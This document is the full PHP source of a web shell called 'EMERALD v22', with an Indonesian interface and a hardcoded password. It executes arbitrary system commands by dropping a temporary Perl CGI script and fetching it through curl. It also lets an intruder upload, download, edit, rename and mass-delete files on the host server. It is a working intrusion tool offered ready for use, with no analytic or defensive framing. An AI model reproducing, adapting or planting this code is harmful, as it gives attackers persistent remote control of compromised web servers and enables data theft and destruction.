<?php
/**
 * EMERALD v22.0 - FINAL ARCHITECT EDITION
 * Fokus: Struktur Rapi, Dual-Extract, CGI Terminal, Mass Actions
 */
error_reporting(0);
session_start();

$pass = 'alfa'; 
$auth_id = md5($pass . $_SERVER['HTTP_USER_AGENT']);

// --- PERSISTENT AUTH (Session + Cookie) ---
if (isset($_POST['key']) && $_POST['key'] === $pass) {
    $_SESSION['em_v22'] = $auth_id;
    setcookie('em_v22_c', $auth_id, time() + (86400 * 7), "/");
}
if ($_SESSION['em_v22'] !== $auth_id && $_COOKIE['em_v22_c'] !== $auth_id) {
    die('<html><body style="background:#050505;color:#0f8;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;font-family:monospace;"><form method="post"><div style="border:1px solid #1f3a2f;padding:40px;text-align:center;background:#0d1110;border-radius:15px;"><h2>EMERALD v22</h2><input type="password" name="key" autofocus style="background:#000;border:1px solid #1f3a2f;color:#0f8;padding:12px;width:250px;text-align:center;border-radius:5px;"><br><button type="submit" style="margin-top:20px;width:100%;padding:12px;background:#008f58;color:#fff;border:none;cursor:pointer;font-weight:bold;border-radius:5px;">ACCESS SYSTEM</button></div></form></body></html>');
}

// --- DIRECTORY MANAGER ---
$d = isset($_GET['d']) ? base64_decode($_GET['d']) : getcwd();
$d = str_replace('\\', '/', $d); @chdir($d); $d = getcwd();
$msg = ''; $out = '';

// --- ULTIMATE CGI EXECUTOR ---
function cgi_run($cmd) {
    $fn = 'exec_'.time().'.cgi';
    $p = "#!/usr/bin/perl\nprint \"Content-type: text/plain\\n\\n\";\nsystem(\"$cmd 2>&1\");";
    @file_put_contents($fn, $p); @chmod($fn, 0755);
    $url = (isset($_SERVER['HTTPS'])?'https':'http')."://".$_SERVER['HTTP_HOST'].dirname($_SERVER['REQUEST_URI'])."/".$fn;
    $ch = curl_init(); curl_setopt($ch,CURLOPT_URL,$url); curl_setopt($ch,CURLOPT_RETURNTRANSFER,1); curl_setopt($ch,CURLOPT_TIMEOUT,10); curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,0);
    $res = curl_exec($ch); curl_close($ch); @unlink($fn);
    return $res;
}

// --- DUAL-METHOD EXTRACT ---
function force_extract($file, $dest) {
    if (class_exists('ZipArchive')) {
        $zip = new ZipArchive;
        if ($zip->open($file) === TRUE) { $zip->extractTo($dest); $zip->close(); return true; }
    }
    $res = cgi_run("unzip -o ".escapeshellarg($file)." -d ".escapeshellarg($dest));
    return (strpos($res, 'extracting') !== false);
}

// --- ACTION HANDLERS ---
if(isset($_POST['cmd'])) { $out = cgi_run($_POST['cmd']); }
if(isset($_FILES['u_f'])) { if(@move_uploaded_file($_FILES['u_f']['tmp_name'], $_FILES['u_f']['name'])) $msg = "Upload Berhasil!"; }
if(isset($_GET['dl'])) {
    $f = base64_decode($_GET['dl']);
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($f).'"');
    readfile($f); exit;
}
if(isset($_POST['a_t'])) {
    $act = $_POST['a_t'];
    if($act == 'rn_i') @rename($_POST['old'], $_POST['new']) ? $msg="Rename Sukses" : $msg="Rename Gagal";
    if($act == 'sv_f') @file_put_contents($_POST['n_i'], $_POST['cnt']) ? $msg="File Disimpan" : $msg="Gagal Simpan";
    if($act == 'mk_d') @mkdir($_POST['n_i']);
    if(isset($_POST['files'])) {
        foreach($_POST['files'] as $f) {
            $f = base64_decode($f);
            if($act == 'mass_del') { is_dir($f) ? cgi_run("rm -rf ".escapeshellarg($f)) : @unlink($f); }
            if($act == 'mass_zip') { if(force_extract($f, $d)) $msg = "Extraction Complete!"; }
        }
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Emerald v22 Architect</title>
    <style>
        :root { --g: #00ff88; --bg: #050505; --card: #0d1110; --border: #1f3a2f; }
        body { background: var(--bg); color: #ccc; font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; display: flex; overflow: hidden; }
        /* Sidebar Navigation */
        .sidebar { width: 340px; height: 100vh; background: var(--card); border-right: 1px solid var(--border); padding: 25px; box-sizing: border-box; overflow-y: auto; }
        /* Main Workspace */
        .main { flex-grow: 1; height: 100vh; overflow-y: auto; padding: 30px; box-sizing: border-box; background: radial-gradient(circle at top right, #0d1412, #050505); }
        .card { background: rgba(0,0,0,0.6); border: 1px solid var(--border); padding: 15px; border-radius: 10px; margin-bottom: 20px; backdrop-filter: blur(5px); }
        h3 { color: var(--g); font-size: 11px; text-transform: uppercase; letter-spacing: 1px; margin-top: 0; border-bottom: 1px solid #1a2a22; padding-bottom: 5px; margin-bottom: 12px; }
        input, textarea { background: #000; border: 1px solid #1f3a2f; color: var(--g); padding: 10px; width: 100%; margin-bottom: 8px; border-radius: 4px; box-sizing: border-box; font-family: monospace; }
        .btn { background: #008f58; color: #fff; border: none; padding: 10px; width: 100%; cursor: pointer; font-weight: bold; border-radius: 4px; transition: 0.3s; }
        .btn:hover { background: var(--g); color: #000; }
        table { width: 100%; border-collapse: collapse; }
        th { text-align: left; color: #555; font-size: 11px; padding: 10px; border-bottom: 1px solid var(--border); }
        td { padding: 10px; border-bottom: 1px solid #111; font-size: 13px; }
        tr:hover { background: rgba(0,255,136,0.03); }
        .link { color: var(--g); text-decoration: none; }
        pre { background: #000; padding: 15px; border: 1px solid var(--g); color: #0f8; white-space: pre-wrap; font-family: 'Consolas', monospace; font-size: 12px; }
        .breadcrumb { font-size: 12px; margin-bottom: 15px; color: #888; }
    </style>
</head>
<body>
    <div class="sidebar">
        <h2 style="color:var(--g); letter-spacing: 3px; margin-bottom:30px;">EMERALD v22</h2>
        <div class="card">
            <h3>CGI Terminal</h3>
            <form method="post"><input type="text" name="cmd" placeholder="ls -la / id / whoami"></form>
        </div>
        <div class="card">
            <h3>Upload System</h3>
            <form method="post" enctype="multipart/form-data"><input type="file" name="u_f"><button class="btn">START UPLOAD</button></form>
        </div>
        <div class="card">
            <h3>Quick Create</h3>
            <form method="post"><input type="hidden" name="a_t" value="mk_d"><input type="text" name="n_i" placeholder="Folder Name"><button class="btn">CREATE DIR</button></form>
            <form method="post" style="margin-top:10px;"><input type="hidden" name="a_t" value="sv_f"><input type="text" name="n_i" placeholder="File Name"><button class="btn">CREATE FILE</button></form>
        </div>
        <a href="?logout=1" style="color:#ff4444; font-size:11px; text-decoration:none;">[ TERMINATE SESSION ]</a>
    </div>

    <div class="main">
        <?php if($msg) echo "<div class='card' style='border-color:var(--g); color:var(--g); font-weight:bold;'>[!] $msg</div>"; ?>
        <div class="breadcrumb">LOKASI: <span style="color:var(--g)"><?=$d?></span></div>
        <?php if($out): ?><div class="card"><h3>Terminal Output</h3><pre><?=htmlspecialchars($out)?></pre></div><?php endif; ?>

        <div class="card">
            <form method="post">
                <div style="margin-bottom:15px; display:flex; gap:10px;">
                    <button type="submit" name="a_t" value="mass_del" class="btn" style="width:auto; background:#600;" onclick="return confirm('Hapus item terpilih?')">MASS DELETE</button>
                    <button type="submit" name="a_t" value="mass_zip" class="btn" style="width:auto; background:#0055ff;">EXTRACT ZIP</button>
                </div>
                <table>
                    <thead>
                        <tr>
                            <th width="30"><input type="checkbox" onclick="var c=document.getElementsByName('files[]');for(var i=0;i<c.length;i++)c[i].checked=this.checked"></th>
                            <th>NAMA ITEM</th>
                            <th width="200">OPSI</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr><td></td><td><a href="?d=<?=base64_encode(dirname($d))?>" class="link">.. [ Kembali ]</a></td><td>-</td></tr>
                        <?php foreach(scandir('.') as $f): if($f=='.'||$f=='..')continue; ?>
                        <tr>
                            <td><input type="checkbox" name="files[]" value="<?=base64_encode($f)?>"></td>
                            <td><?=(is_dir($f)?'📁':'📄')?> <a href="<?=is_dir($f)?'?d='.base64_encode($d.'/'.$f):'#'?>" class="link"><?=htmlspecialchars($f)?></a></td>
                            <td>
                                <a href="?d=<?=base64_encode($d)?>&e=<?=base64_encode($f)?>" style="color:#0af; text-decoration:none;">Edit</a> | 
                                <a href="?d=<?=base64_encode($d)?>&dl=<?=base64_encode($f)?>" style="color:var(--g); text-decoration:none;">Download</a>
                            </td>
                        </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            </form>
        </div>

        <?php if(isset($_GET['e'])): $ef = base64_decode($_GET['e']); ?>
        <div class="card">
            <h3>Editor & Rename: <?=htmlspecialchars($ef)?></h3>
            <form method="post">
                <input type="hidden" name="a_t" value="sv_f">
                <input type="hidden" name="n_i" value="<?=htmlspecialchars($ef)?>">
                <textarea name="cnt" rows="18"><?=htmlspecialchars(@file_get_contents($ef))?></textarea>
                <button type="submit" class="btn">SIMPAN PERUBAHAN</button>
            </form>
            <form method="post" style="margin-top:20px; border-top:1px solid #1a2a22; padding-top:15px;">
                <input type="hidden" name="a_t" value="rn_i">
                <input type="hidden" name="old" value="<?=htmlspecialchars($ef)?>">
                GANTI NAMA: <input type="text" name="new" placeholder="Nama baru..." style="width:250px; margin-right:10px;"> 
                <button type="submit" class="btn" style="width:auto; padding:8px 25px;">OK</button>
            </form>
        </div>
        <?php endif; ?>
    </div>
</body>
</html>